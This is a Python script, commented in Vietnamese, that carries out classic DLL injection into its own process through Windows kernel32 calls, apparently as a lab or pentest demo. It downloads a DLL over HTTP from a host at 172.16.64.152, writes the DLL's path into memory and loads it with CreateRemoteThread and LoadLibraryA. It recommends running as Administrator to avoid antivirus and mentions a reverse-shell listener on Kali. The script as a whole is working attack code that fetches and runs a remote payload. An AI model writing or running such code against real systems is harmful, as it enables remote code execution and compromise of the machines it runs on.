"""
Classic DLL Injection - Self-Injection (tiêm vào chính tiến trình đang chạy)
Demo đầy đủ 4 bước injection pipeline nhưng inject vào chính mình,
tránh hoàn toàn lỗi quyền truy cập cross-process.

LƯU Ý: Chạy với quyền Administrator để tránh bị AV chặn.
"""

import os
import sys
import ctypes
from ctypes import wintypes
import urllib.request

# ==================== HẰNG SỐ ====================
MEM_COMMIT  = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_READWRITE = 0x04

# ==================== KHAI BÁO API ====================
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

kernel32.GetCurrentProcess.restype = wintypes.HANDLE
kernel32.GetCurrentProcess.argtypes = []

kernel32.VirtualAllocEx.restype = ctypes.c_void_p
kernel32.VirtualAllocEx.argtypes = [
    wintypes.HANDLE, ctypes.c_void_p, ctypes.c_size_t,
    wintypes.DWORD, wintypes.DWORD
]

kernel32.WriteProcessMemory.restype = wintypes.BOOL
kernel32.WriteProcessMemory.argtypes = [
    wintypes.HANDLE, ctypes.c_void_p, ctypes.c_void_p,
    ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)
]

kernel32.GetModuleHandleA.restype = wintypes.HMODULE
kernel32.GetModuleHandleA.argtypes = [wintypes.LPCSTR]

kernel32.GetProcAddress.restype = ctypes.c_void_p
kernel32.GetProcAddress.argtypes = [wintypes.HMODULE, wintypes.LPCSTR]

kernel32.CreateRemoteThread.restype = wintypes.HANDLE
kernel32.CreateRemoteThread.argtypes = [
    wintypes.HANDLE, ctypes.c_void_p, ctypes.c_size_t,
    ctypes.c_void_p, ctypes.c_void_p,
    wintypes.DWORD, ctypes.POINTER(wintypes.DWORD)
]

kernel32.WaitForSingleObject.restype = wintypes.DWORD
kernel32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]

kernel32.CloseHandle.restype = wintypes.BOOL
kernel32.CloseHandle.argtypes = [wintypes.HANDLE]

# ==================== BƯỚC 1: LẤY HANDLE TIẾN TRÌNH HIỆN TẠI ====================
print("[*] Bước 1: Lấy handle tiến trình hiện tại (self-injection)...")

pid = os.getpid()
hProcess = kernel32.GetCurrentProcess()  # Trả về pseudo-handle -1, luôn có FULL ACCESS

print(f"[+] PID tiến trình hiện tại: {pid}")
print(f"[+] Handle: {hProcess}")

# ==================== TẢI DLL TỪ MÁY CHỦ ====================
print("[*] Đang tải DLL từ máy chủ...")

url = "http://172.16.64.152/test.dll"
destination = "test.dll"

try:
    urllib.request.urlretrieve(url, destination)
    dll_path = os.path.abspath(destination)
    print(f"[+] DLL đã lưu tại: {dll_path}")
except Exception as e:
    print(f"[-] Lỗi tải DLL: {e}")
    sys.exit(1)

dll_bytes = dll_path.encode('utf-8') + b'\x00'

# ==================== BƯỚC 2: CẤP PHÁT BỘ NHỚ ====================
print("[*] Bước 2: Cấp phát bộ nhớ trong tiến trình...")

addr = kernel32.VirtualAllocEx(
    hProcess, None, len(dll_bytes),
    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
)
if not addr:
    print(f"[-] VirtualAllocEx thất bại. Lỗi: {ctypes.get_last_error()}")
    sys.exit(1)
print(f"[+] Đã cấp phát bộ nhớ tại: {hex(addr)}")

# ==================== BƯỚC 3: GHI ĐƯỜNG DẪN DLL VÀO BỘ NHỚ ====================
print("[*] Bước 3: Ghi đường dẫn DLL vào bộ nhớ...")

written = ctypes.c_size_t(0)
result = kernel32.WriteProcessMemory(
    hProcess, ctypes.c_void_p(addr),
    dll_bytes, len(dll_bytes),
    ctypes.byref(written)
)
if not result:
    print(f"[-] WriteProcessMemory thất bại. Lỗi: {ctypes.get_last_error()}")
    sys.exit(1)
print(f"[+] Đã ghi {written.value} bytes.")

# ==================== BƯỚC 4: TẠO LUỒNG THỰC THI ====================
print("[*] Bước 4: Phân giải LoadLibraryA và tạo luồng...")

h_kernel32 = kernel32.GetModuleHandleA(b"kernel32.dll")
load_lib_addr = kernel32.GetProcAddress(h_kernel32, b"LoadLibraryA")

if not load_lib_addr:
    print(f"[-] GetProcAddress thất bại. Lỗi: {ctypes.get_last_error()}")
    sys.exit(1)
print(f"[+] Địa chỉ LoadLibraryA: {hex(load_lib_addr)}")

thread_id = wintypes.DWORD(0)
hThread = kernel32.CreateRemoteThread(
    hProcess, None, 0,
    ctypes.c_void_p(load_lib_addr),
    ctypes.c_void_p(addr),
    0, ctypes.byref(thread_id)
)

if not hThread:
    err = ctypes.get_last_error()
    print(f"[-] CreateRemoteThread thất bại. Lỗi: {err}")
    sys.exit(1)

print(f"[+] Inject thành công! Thread ID: {thread_id.value}")

# Chờ DLL nạp xong
kernel32.WaitForSingleObject(hThread, 10000)
kernel32.CloseHandle(hThread)

print("[+] Hoàn tất thực nghiệm Classic DLL Injection (self-injection).")
print("[+] Nếu DLL là reverse shell, kiểm tra listener trên Kali.")
